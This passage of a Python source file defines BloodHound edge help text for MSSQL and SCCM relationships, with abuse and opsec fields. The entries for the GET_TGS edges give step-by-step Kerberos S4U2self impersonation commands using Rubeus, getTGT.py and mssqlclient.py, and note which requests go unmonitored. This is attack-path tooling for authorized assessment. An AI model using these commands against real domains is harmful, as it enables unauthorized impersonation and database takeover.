            "The domain account has a SQL Server login that is enabled and can connect to the "
            "SQL Server. This allows authentication to SQL Server using the account's "
            "credentials.\n"
            "For the SCCM site-server/provider machine accounts, this login is templated "
            "from SCCM's mandatory setup (every site system gets a login on the site "
            "database) rather than enumerated from `sys.server_principals`. False "
            "positive: if the host that appears to be the site database was only "
            "inferred from an MSSQLSvc SPN and general SCCM-relatedness rather than "
            "confirmed by RemoteRegistry/AdminService/WMI, the login this edge describes "
            "may not actually exist."
        ),
        windowsAbuse=(
            "Connect to the target SQL server and authenticate as the target login (e.g., "
            "using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling "
            "such as impacket mssqlclient.py)."
        ),
        linuxAbuse=(
            "Connect to the target SQL server and authenticate as the target login (e.g., "
            "using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, "
            "mssql-cli, or SQL Server Management Studio)."
        ),
        opsec=(
            "Windows authentication attempts are logged in SQL Server error logs for failed "
            "logins. Successful logins are not logged by default but can be enabled. Computer "
            "account authentication appears as DOMAIN\\COMPUTER$."
        ),
        references=[
            "https://learn.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode?view=sql-server-ver17",
            "https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/server-properties-security-page?view=sql-server-ver17",
        ],
    ),
    ek.MSSQL_IS_MAPPED_TO: EdgeHelp(
        general=(
            "The source server login is mapped to the target database user in the associated "
            "database.\n"
            "For the SCCM site-server/provider logins, this mapping is templated from "
            "SCCM's install-time requirement that every site system's machine account "
            "become a database user in the site database, not read from "
            "`sys.database_principals`. Its reliability tracks the underlying "
            "site-database identification: solid when RemoteRegistry, AdminService, or "
            "WMI confirmed it, an assumption (and provenance-tagged) when an MSSQLSvc SPN "
            "plus SCCM-relatedness stood in for confirmation."
        ),
        windowsAbuse="Connect as the source login and use the associated database: `USE database_name;`",
        linuxAbuse="Connect as the source login and use the associated database: `USE database_name;`",
        opsec="This is a static mapping. Actions are logged based on what the database user does.",
        references=[
            "https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/create-a-database-user?view=sql-server-ver17",
        ],
    ),
    ek.MSSQL_MEMBER_OF: EdgeHelp(
        general=(
            "The source principal is a member of the target role. This membership grants all "
            "permissions associated with the target role to the source principal.\n"
            "On the SCCM site database, the db_owner and sysadmin memberships this edge "
            "describes for site-server/provider accounts are templated from SCCM's "
            "mandatory permission model, not queried from `sys.database_role_members` / "
            "`sys.server_role_members`. Treat it with the same confidence as the "
            "site-database identification it rests on: solid when RemoteRegistry, "
            "AdminService, or WMI confirmed the database server, an assumption that can "
            "be wrong when the server was only inferred from an MSSQLSvc SPN plus its "
            "co-location with other SCCM roles."
        ),
        windowsAbuse=(
            "When connected to the server/database as the source principal, you have all "
            "permissions granted to the target role."
        ),
        linuxAbuse=(
            "When connected to the server/database as the source principal, you have all "
            "permissions granted to the target role."
        ),
        opsec=(
            "Role membership is a static relationship. Actions performed using role "
            "permissions are logged based on the specific operation, not the role membership "
            "itself.\n"
            "To view current role memberships at server level:\n"
            "`SELECT r.name AS RoleName, m.name AS MemberName FROM sys.server_role_members rm "
            "JOIN sys.server_principals r ON rm.role_principal_id = r.principal_id JOIN "
            "sys.server_principals m ON rm.member_principal_id = m.principal_id ORDER BY "
            "r.name, m.name;`\n"
            "To view current role memberships at database level:\n"
            "`SELECT r.name AS RoleName, m.name AS MemberName FROM sys.database_role_members "
            "rm JOIN sys.database_principals r ON rm.role_principal_id = r.principal_id JOIN "
            "sys.database_principals m ON rm.member_principal_id = m.principal_id ORDER BY "
            "r.name, m.name;`"
        ),
        references=[
            "https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-ver17",
            "https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-ver17",
            "https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-server-role-members-transact-sql?view=sql-server-ver17",
            "https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-database-role-members-transact-sql?view=sql-server-ver17",
        ],
    ),
    ek.MSSQL_SERVICE_ACCOUNT_FOR: EdgeHelp(
        general="This domain account runs the SQL Server service.",
        windowsAbuse=(
            "The service account context determines SQL Server's access to network resources "
            "and local system privileges."
        ),
        linuxAbuse=(
            "The service account context determines SQL Server's access to system resources "
            "and file permissions."
        ),
        opsec=(
            "Service account changes require service restart and are logged in Windows event "
            "logs."
        ),
        references=[
            "https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-ver17",
        ],
    ),
    ek.MSSQL_GET_ADMIN_TGS: EdgeHelp(
        general=(
            "The SQL Server service account can request Kerberos service tickets for domain "
            "accounts that have administrative privileges on this SQL Server."
        ),
        windowsAbuse=(
            "From a domain-joined machine as the service account (or with valid credentials):\n"
            "`# List SPNs for the SQL Server to find target accounts:`\n"
            "`setspn -L target_sql_server`\n"
            "`# Request TGT for the service account:`\n"
            "`.\\Rubeus.exe asktgt /domain:<domain_fqdn> /user:<service_account> "
            "/password:<password> /nowrap`\n"
            "`# Get a TGS for the MSSQLSvc SPN using S4U2self, impersonating the domain DBA:`\n"
            "`Rubeus.exe s4u /impersonateuser:<dba> /altservice:<spn> /self /nowrap "
            "/ticket:<base64>`\n"
            "`# Start a sacrificial logon session for the Kerberos ticket:`\n"
            "`runas /netonly /user:asdf powershell`\n"
            "`# Import the ticket into the sacrificial logon session:`\n"
            "`Rubeus.exe ptt /ticket:<base64>`\n"
            "`# Launch SQL Server Management Studio or sqlcmd and connect to the database.`"
        ),
        linuxAbuse=(
            "From a Linux machine with valid credentials:\n"
            "`# Request TGT for the service account:`\n"
            "`getTGT.py internal.lab/sqlsvc:P@ssw0rd`\n"
            "`# Get a TGS for the MSSQLSvc SPN using S4U2self, impersonating the domain DBA:`\n"
            "`python3 gets4uticket.py "
            "kerberos+ccache://internal.lab\\sqlsvc:sqlsvc.ccache@dc01.internal.lab "
            "MSSQLSvc/sql.internal.lab:1433@internal.lab sccm$@internal.lab sccm_s4u.ccache "
            "-v`\n"
            "`# Connect to the database:`\n"
            "`KRB5CCNAME=sccm_s4u.ccache mssqlclient.py internal.lab/sccm$@sql.internal.lab -k "
            "-no-pass -windows-auth`"
        ),
        opsec=(
            "Kerberos ticket requests are normal behavior and rarely logged. High volume of "
            "TGS requests might be detected by advanced threat hunting. Event ID 4769 "
            "(Kerberos Service Ticket Request) is logged on domain controllers but typically "
            "not monitored for SQL service accounts."
        ),
        references=[
            "https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/register-a-service-principal-name-for-kerberos-connections?view=sql-server-ver17",
        ],
    ),
    ek.MSSQL_GET_TGS: EdgeHelp(
        general=(
            "The SQL Server service account can request Kerberos service tickets for domain "
            "accounts that have a login on this SQL Server."
        ),
        windowsAbuse=(
            "From a domain-joined machine as the service account (or with valid credentials):\n"
            "`# List SPNs for the SQL Server to find target accounts:`\n"
            "`setspn -L target_sql_server`\n"
            "`# Request TGT for the service account:`\n"
            "`.\\Rubeus.exe asktgt /domain:<domain_fqdn> /user:<service_account> "
            "/password:<password> /nowrap`\n"
            "`# Get a TGS for the MSSQLSvc SPN using S4U2self, impersonating the domain "
            "account:`\n"
            "`Rubeus.exe s4u /impersonateuser:<account> /altservice:<spn> /self /nowrap "
            "/ticket:<base64>`\n"
            "`# Start a sacrificial logon session for the Kerberos ticket:`\n"
            "`runas /netonly /user:asdf powershell`\n"
            "`# Import the ticket into the sacrificial logon session:`\n"
            "`Rubeus.exe ptt /ticket:<base64>`\n"
            "`# Launch SQL Server Management Studio or sqlcmd and connect to the database.`"
        ),
        linuxAbuse=(
            "From a Linux machine with valid credentials:\n"
            "`# Request TGT for the service account:`\n"
            "`getTGT.py internal.lab/sqlsvc:P@ssw0rd`\n"
            "`# Get a TGS for the MSSQLSvc SPN using S4U2self, impersonating the domain "
            "account:`\n"
            "`python3 gets4uticket.py "
            "kerberos+ccache://internal.lab\\sqlsvc:sqlsvc.ccache@dc01.internal.lab "
            "MSSQLSvc/sql.internal.lab:1433@internal.lab sccm$@internal.lab sccm_s4u.ccache "
            "-v`\n"
            "`# Connect to the database:`\n"
            "`KRB5CCNAME=sccm_s4u.ccache mssqlclient.py internal.lab/sccm$@sql.internal.lab -k "
            "-no-pass -windows-auth`"
        ),
        opsec=(
            "Kerberos ticket requests are normal behavior and rarely logged. High volume of "
            "TGS requests might be detected by advanced threat hunting. Event ID 4769 "
            "(Kerberos Service Ticket Request) is logged on domain controllers but typically "
            "not monitored for SQL service accounts."
        ),
        references=[
            "https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/register-a-service-principal-name-for-kerberos-connections?view=sql-server-ver17",
        ],
    ),
}


# Scoped edge kinds still awaiting authored content. As each block is written, add it
# to EDGE_HELP above and delete the kind here. Keeping unwritten kinds out of EDGE_HELP
# means no placeholder prose is ever emitted to BloodHound. The disjoint / scope tests
# in edge_help_test.py enforce that this list plus EDGE_HELP exactly covers the scope.
PENDING_HELP_KINDS: tuple[str, ...] = ()  # all scoped edge kinds are now authored above
